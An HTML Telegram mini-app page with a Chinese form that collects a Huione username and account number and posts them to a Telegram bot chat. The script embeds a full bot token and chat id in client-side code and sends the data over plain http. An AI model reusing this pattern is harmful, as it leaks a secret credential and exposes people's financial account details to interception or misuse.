<!DOCTYPE html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>
<body>
    <div style="margin: 20px;">
        <form>
            <div class="form-group">
              <label for="username">汇旺用户名</label>
              <input type="username" class="form-control" id="username" aria-describedby="emailHelp" placeholder="例如: 张三">
              <small id="usernameHelp" class="form-text text-muted">实名认证的名字</small>
            </div>
            <div class="form-group">
              <label for="account">汇旺账号</label>
              <input type="phone" class="form-control" id="account" placeholder="例如: 855111212123">
              <small id="phoneHelp" class="form-text text-muted">通常为您的手机号</small>
            </div>
          </form>
    </div>
    <script>
        Telegram.WebApp.ready();
        Telegram.WebApp.MainButton.setParams({
            text: '提交',
            is_visible: true
        }).onClick(submit);

        function submit() {
            if (document.getElementById('username').value == '') {
                alert('请输入汇旺用户名');
                return;
            }

            if (document.getElementById('account').value == '') {
                alert('请输入汇旺账号');
                return;
            }
            
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://api.telegram.org/bot5858680229:AAEqC1cibJLPbu0HahT0yALK4M_YMeRWf-k/sendMessage');
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onload = function() {
                if (xhr.status != 200) { // HTTP error?
                    // handle error
                    alert('提交失败！请稍后再试');
                } else { // show the result
                    alert('提交成功');
                    Telegram.WebApp.close();
                }
            };
            xhr.onerror = function() {
                alert('提交失败！请稍后再试');
            };
            
            xhr.send(JSON.stringify({
                "chat_id": "5458197333",
                "text": "汇旺用户名: " + document.getElementById('username').value + "\n" + "汇旺账号: " + document.getElementById('account').value
            }));
        }
    </script>
</body>
</html>
